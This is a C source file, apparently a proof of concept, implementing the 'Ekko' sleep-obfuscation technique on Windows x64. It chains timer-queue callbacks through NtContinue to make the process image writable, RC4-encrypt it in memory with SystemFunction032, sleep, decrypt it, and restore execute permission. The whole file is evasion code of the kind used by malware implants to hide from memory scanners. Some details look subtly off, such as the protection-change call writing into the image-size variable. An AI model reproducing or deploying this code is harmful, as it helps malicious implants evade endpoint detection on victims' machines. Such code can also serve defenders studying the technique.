#include <windows.h>
#include <stdio.h>
#include "ekko.h"

// Define needed NT types
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

// Context definitions for x64
// We use CONTEXT explicitly
// Assuming compilation on Windows x64 or cross-compiler with windows.h support

// Import NtContinue and SystemFunction032 dynamically
typedef NTSTATUS (NTAPI *NtContinue_t)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
typedef NTSTATUS (NTAPI *SystemFunction032_t)(struct USTRING* Data, struct USTRING* Key);

typedef struct USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

void EkkoSleep(DWORD SleepTime)
{
    // Context is process specific, we just need a dummy key
    char KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
    USTRING Key = { 16, 16, KeyBuf };

    USTRING Img = { 0 };
    PVOID   ImageBase = GetModuleHandle(NULL);
    DWORD   ImageSize = 0;

    // Retrieve size of image
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)ImageBase + pDos->e_lfanew);
    ImageSize = pNt->OptionalHeader.SizeOfImage;

    Img.Buffer = ImageBase;
    Img.Length = ImageSize;
    Img.MaximumLength = ImageSize;

    // Resolve functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");

    NtContinue_t NtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    SystemFunction032_t SystemFunction032 = (SystemFunction032_t)GetProcAddress(hAdvapi, "SystemFunction032");

    if (!NtContinue || !SystemFunction032) {
        // Fallback if resolution fails
        Sleep(SleepTime);
        return;
    }

    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hNewTimer = NULL;

    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

    HANDLE  hEvent = CreateEventW(0, 0, 0, 0);

    // Capture current context
    RtlCaptureContext(&CtxThread);

    // Copy contexts for ROP chain
    memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

    // 1. VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &OldProtect)
    RopProtRW.Rsp  -= 8;
    RopProtRW.Rip   = (DWORD64)VirtualProtect;
    RopProtRW.Rcx   = (DWORD64)ImageBase;
    RopProtRW.Rdx   = (DWORD64)ImageSize;
    RopProtRW.R8    = (DWORD64)PAGE_READWRITE;
    RopProtRW.R9    = (DWORD64)&ImageSize; // Just a writable pointer location

    // 2. SystemFunction032(&Img, &Key) - Encrypt
    RopMemEnc.Rsp  -= 8;
    RopMemEnc.Rip   = (DWORD64)SystemFunction032;
    RopMemEnc.Rcx   = (DWORD64)&Img;
    RopMemEnc.Rdx   = (DWORD64)&Key;

    // 3. WaitForSingleObject(hTarget, SleepTime) - Delay
    RopDelay.Rsp   -= 8;
    RopDelay.Rip    = (DWORD64)WaitForSingleObject;
    RopDelay.Rcx    = (DWORD64)GetCurrentProcess(); // Dummy handle
    RopDelay.Rdx    = (DWORD64)SleepTime;

    // 4. SystemFunction032(&Img, &Key) - Decrypt
    RopMemDec.Rsp  -= 8;
    RopMemDec.Rip   = (DWORD64)SystemFunction032;
    RopMemDec.Rcx   = (DWORD64)&Img;
    RopMemDec.Rdx   = (DWORD64)&Key;

    // 5. VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect)
    RopProtRX.Rsp  -= 8;
    RopProtRX.Rip   = (DWORD64)VirtualProtect;
    RopProtRX.Rcx   = (DWORD64)ImageBase;
    RopProtRX.Rdx   = (DWORD64)ImageSize;
    RopProtRX.R8    = (DWORD64)PAGE_EXECUTE_READ;
    RopProtRX.R9    = (DWORD64)&ImageSize; // Scratch

    // 6. SetEvent(hEvent)
    RopSetEvt.Rsp  -= 8;
    RopSetEvt.Rip   = (DWORD64)SetEvent;
    RopSetEvt.Rcx   = (DWORD64)hEvent;

    // Schedule Timers
    // Note: Timers fire in separate threads, we use NtContinue to hijacking execution context
    // This PoC assumes x64

    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 300 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 400 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 500 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);

    DeleteTimerQueue(hTimerQueue);
}
